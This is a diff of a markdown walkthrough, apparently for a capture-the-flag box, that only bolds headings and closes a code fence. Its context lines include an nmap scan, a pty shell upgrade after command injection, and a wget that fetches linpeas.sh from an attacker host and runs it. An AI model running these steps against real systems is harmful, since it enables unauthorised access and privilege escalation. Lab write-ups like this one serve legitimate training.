@@ -6,7 +6,7 @@
  sudo nmap -sS -sV -sC --top-ports 100 ip_address -oA ip_address
  ```
  
- 2. Command Injection
+**2. Command Injection**
 
 ```bash
 # victim machine
@@ -24,7 +24,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 ```
 
-3. Privellege Escalation
+**3. Privellege Escalation**
 
 ```bash
 # https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
@@ -40,6 +40,7 @@ wget http://10.10.14.8:5555/linpeas.sh
 chmod +x linpeas.sh
 
 ./linpeas.sh
+```
 
 
 
